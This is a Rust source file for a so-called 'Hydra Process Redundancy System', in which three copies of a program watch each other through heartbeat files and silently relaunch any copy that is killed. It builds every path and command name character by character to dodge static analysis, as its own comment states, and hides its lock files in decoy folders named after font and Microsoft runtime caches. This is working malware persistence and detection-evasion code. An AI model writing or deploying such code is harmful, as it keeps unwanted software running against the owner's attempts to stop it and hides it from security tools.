//! Hydra Process Redundancy System

#![allow(dead_code)]

use std::collections::HashMap;
use std::fs::{self, File, OpenOptions};
use std::io::Write;
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use std::hint::black_box;

pub const HYDRA_HEADS: usize = 3;
const HEARTBEAT_INTERVAL: u64 = 5;
const HEARTBEAT_TIMEOUT: u64 = 15;
const MAX_RESPAWN_BACKOFF: u64 = 60;

// ============================================================================
// STRING BUILDERS (Anti-static analysis)
// ============================================================================

#[inline(always)]
fn bs(chars: &[char]) -> String {
    let mut s = String::with_capacity(chars.len());
    for &c in chars { s.push(c); }
    black_box(s)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum HydraHead {
    Alpha = 0,
    Beta = 1,
    Gamma = 2,
}

impl HydraHead {
    pub fn from_index(idx: usize) -> Option<Self> {
        match idx {
            0 => Some(Self::Alpha),
            1 => Some(Self::Beta),
            2 => Some(Self::Gamma),
            _ => None,
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::Alpha => "alpha",
            Self::Beta => "beta",
            Self::Gamma => "gamma",
        }
    }

    pub fn siblings(&self) -> Vec<HydraHead> {
        [Self::Alpha, Self::Beta, Self::Gamma]
            .into_iter()
            .filter(|h| h != self)
            .collect()
    }
}

impl std::fmt::Display for HydraHead {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", self.name())
    }
}

#[derive(Debug, Clone)]
pub struct HeadState {
    pub head: HydraHead,
    pub pid: Option<u32>,
    pub last_heartbeat: Instant,
    pub respawn_count: u32,
    pub is_alive: bool,
}

impl HeadState {
    pub fn new(head: HydraHead) -> Self {
        Self {
            head,
            pid: None,
            last_heartbeat: Instant::now(),
            respawn_count: 0,
            is_alive: false,
        }
    }

    pub fn is_stale(&self) -> bool {
        self.last_heartbeat.elapsed() > Duration::from_secs(HEARTBEAT_TIMEOUT)
    }

    pub fn update_heartbeat(&mut self) {
        self.last_heartbeat = Instant::now();
        self.is_alive = true;
    }
}

pub struct HydraManager {
    my_head: HydraHead,
    heads: HashMap<HydraHead, HeadState>,
    ipc_dir: PathBuf,
    shutdown: Arc<AtomicBool>,
    children: Vec<Child>,
}

impl HydraManager {
    pub fn new() -> Result<Self, HydraError> {
        let ipc_dir = Self::get_ipc_dir()?;
        fs::create_dir_all(&ipc_dir)?;

        let my_head = Self::claim_head(&ipc_dir)?;

        let mut heads = HashMap::new();
        for i in 0..HYDRA_HEADS {
            if let Some(h) = HydraHead::from_index(i) {
                heads.insert(h, HeadState::new(h));
            }
        }

        if let Some(state) = heads.get_mut(&my_head) {
            state.pid = Some(std::process::id());
            state.is_alive = true;
        }

        Ok(Self {
            my_head,
            heads,
            ipc_dir,
            shutdown: Arc::new(AtomicBool::new(false)),
            children: Vec::new(),
        })
    }

    fn get_ipc_dir() -> Result<PathBuf, HydraError> {
        #[cfg(windows)]
        {
            // Constrói em runtime para evitar detecção estática
            let env_key = bs(&['L','O','C','A','L','A','P','P','D','A','T','A']);
            let fallback = bs(&['C',':','\\','U','s','e','r','s','\\','P','u','b','l','i','c']);
            let appdata = std::env::var(&env_key).unwrap_or(fallback);
            let cache = bs(&['.','c','a','c','h','e']);
            let subdir = bs(&['m','s','-','r','u','n','t','i','m','e']);
            Ok(PathBuf::from(appdata).join(cache).join(subdir))
        }

        #[cfg(unix)]
        {
            let env_key = bs(&['H','O','M','E']);
            let fallback = bs(&['/','t','m','p']);
            let home = std::env::var(&env_key).unwrap_or(fallback);
            let cache = bs(&['.','c','a','c','h','e']);
            let subdir = bs(&['f','o','n','t','c','o','n','f','i','g']);
            Ok(PathBuf::from(home).join(cache).join(subdir))
        }
    }

    fn claim_head(ipc_dir: &PathBuf) -> Result<HydraHead, HydraError> {
        for i in 0..HYDRA_HEADS {
            let head = HydraHead::from_index(i).unwrap();
            let lock_ext = bs(&['.','l','o','c','k']);
            let lock_path = ipc_dir.join(format!("{}{}", head.name(), lock_ext));

            match Self::try_acquire_lock(&lock_path) {
                Ok(true) => return Ok(head),
                Ok(false) => continue,
                Err(_) => continue,
            }
        }

        Err(HydraError::AllHeadsClaimed)
    }

    fn try_acquire_lock(path: &PathBuf) -> Result<bool, HydraError> {
        if path.exists() {
            if let Ok(content) = fs::read_to_string(path) {
                if let Ok(pid) = content.trim().parse::<u32>() {
                    if Self::process_exists(pid) {
                        return Ok(false);
                    }
                }
            }
            let _ = fs::remove_file(path);
        }

        let mut file = File::create(path)?;
        write!(file, "{}", std::process::id())?;
        Ok(true)
    }

    fn process_exists(pid: u32) -> bool {
        #[cfg(unix)]
        {
            unsafe { libc::kill(pid as i32, 0) == 0 }
        }

        #[cfg(windows)]
        {
            let cmd = bs(&['t','a','s','k','l','i','s','t']);
            let arg = bs(&['/','F','I']);
            Command::new(&cmd)
                .args([&arg, &format!("PID eq {}", pid)])
                .output()
                .map(|o| {
                    let out = String::from_utf8_lossy(&o.stdout);
                    out.contains(&pid.to_string())
                })
                .unwrap_or(false)
        }

        #[cfg(not(any(unix, windows)))]
        {
            let _ = pid;
            false
        }
    }

    pub fn send_heartbeat(&self) -> Result<(), HydraError> {
        let hb_ext = bs(&['.','h','b']);
        let hb_path = self.ipc_dir.join(format!("{}{}", self.my_head.name(), hb_ext));
        
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .unwrap_or(0);

        let mut file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(&hb_path)?;

        write!(file, "{}:{}", std::process::id(), timestamp)?;
        Ok(())
    }

    pub fn check_siblings(&mut self) -> Vec<HydraHead> {
        let mut dead_heads = Vec::new();
        let hb_ext = bs(&['.','h','b']);

        for sibling in self.my_head.siblings() {
            let hb_path = self.ipc_dir.join(format!("{}{}", sibling.name(), hb_ext));

            let is_alive = if let Ok(content) = fs::read_to_string(&hb_path) {
                if let Some(ts_str) = content.split(':').nth(1) {
                    if let Ok(ts) = ts_str.trim().parse::<u64>() {
                        let now = SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .map(|d| d.as_secs())
                            .unwrap_or(0);
                        
                        now.saturating_sub(ts) < HEARTBEAT_TIMEOUT
                    } else {
                        false
                    }
                } else {
                    false
                }
            } else {
                false
            };

            if let Some(state) = self.heads.get_mut(&sibling) {
                if is_alive {
                    state.update_heartbeat();
                } else if state.is_alive {
                    state.is_alive = false;
                    dead_heads.push(sibling);
                }
            }
        }

        dead_heads
    }

    pub fn respawn_head(&mut self, head: HydraHead) -> Result<(), HydraError> {
        let lock_ext = bs(&['.','l','o','c','k']);
        let hb_ext = bs(&['.','h','b']);
        
        let lock_path = self.ipc_dir.join(format!("{}{}", head.name(), lock_ext));
        let hb_path = self.ipc_dir.join(format!("{}{}", head.name(), hb_ext));
        
        let _ = fs::remove_file(&lock_path);
        let _ = fs::remove_file(&hb_path);

        let exe_path = std::env::current_exe()?;

        let state = self.heads.get_mut(&head).unwrap();
        let backoff = std::cmp::min(2u64.pow(state.respawn_count), MAX_RESPAWN_BACKOFF);
        state.respawn_count += 1;

        if backoff > 1 {
            std::thread::sleep(Duration::from_secs(backoff));
        }

        let arg1 = bs(&['-','-','s','k','i','p','-','c','h','e','c','k','s']);
        let arg2 = bs(&['-','-','h','y','d','r','a','-','r','o','l','e']);
        
        let child = Command::new(&exe_path)
            .args([&arg1, &arg2, head.name()])
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()?;

        state.pid = Some(child.id());
        self.children.push(child);

        Ok(())
    }

    pub async fn run_watchdog(&mut self) -> Result<(), HydraError> {
        loop {
            if self.shutdown.load(Ordering::SeqCst) {
                break;
            }

            let _ = self.send_heartbeat();
            let dead = self.check_siblings();
            
            for head in dead {
                let _ = self.respawn_head(head);
            }

            tokio::time::sleep(Duration::from_secs(HEARTBEAT_INTERVAL)).await;
        }

        Ok(())
    }

    pub fn spawn_siblings(&mut self) -> Result<(), HydraError> {
        if self.my_head != HydraHead::Alpha {
            return Ok(());
        }

        let hb_ext = bs(&['.','h','b']);

        for sibling in self.my_head.siblings() {
            let hb_path = self.ipc_dir.join(format!("{}{}", sibling.name(), hb_ext));
            if hb_path.exists() {
                if let Ok(content) = fs::read_to_string(&hb_path) {
                    if let Some(ts_str) = content.split(':').nth(1) {
                        if let Ok(ts) = ts_str.trim().parse::<u64>() {
                            let now = SystemTime::now()
                                .duration_since(UNIX_EPOCH)
                                .map(|d| d.as_secs())
                                .unwrap_or(0);
                            
                            if now.saturating_sub(ts) < HEARTBEAT_TIMEOUT {
                                continue;
                            }
                        }
                    }
                }
            }

            self.respawn_head(sibling)?;
            std::thread::sleep(Duration::from_millis(500));
        }

        Ok(())
    }

    pub fn shutdown(&self) {
        self.shutdown.store(true, Ordering::SeqCst);
        
        let lock_ext = bs(&['.','l','o','c','k']);
        let hb_ext = bs(&['.','h','b']);
        
        let lock_path = self.ipc_dir.join(format!("{}{}", self.my_head.name(), lock_ext));
        let hb_path = self.ipc_dir.join(format!("{}{}", self.my_head.name(), hb_ext));
        
        let _ = fs::remove_file(lock_path);
        let _ = fs::remove_file(hb_path);
    }

    pub fn my_identity(&self) -> HydraHead {
        self.my_head
    }

    pub fn all_heads_alive(&self) -> bool {
        self.heads.values().all(|s| s.is_alive)
    }

    pub fn alive_count(&self) -> usize {
        self.heads.values().filter(|s| s.is_alive).count()
    }
}

impl Drop for HydraManager {
    fn drop(&mut self) {
        self.shutdown();
        for child in &mut self.children {
            let _ = child.kill();
        }
    }
}

#[derive(Debug, thiserror::Error)]
pub enum HydraError {
    #[error("claimed")]
    AllHeadsClaimed,
    
    #[error("{0}")]
    Io(#[from] std::io::Error),
    
    #[error("{0}")]
    Ipc(String),
    
    #[error("{0}")]
    SpawnFailed(String),
}

#[cfg(unix)]
mod libc {
    extern "C" {
        pub fn kill(pid: i32, sig: i32) -> i32;
    }
}
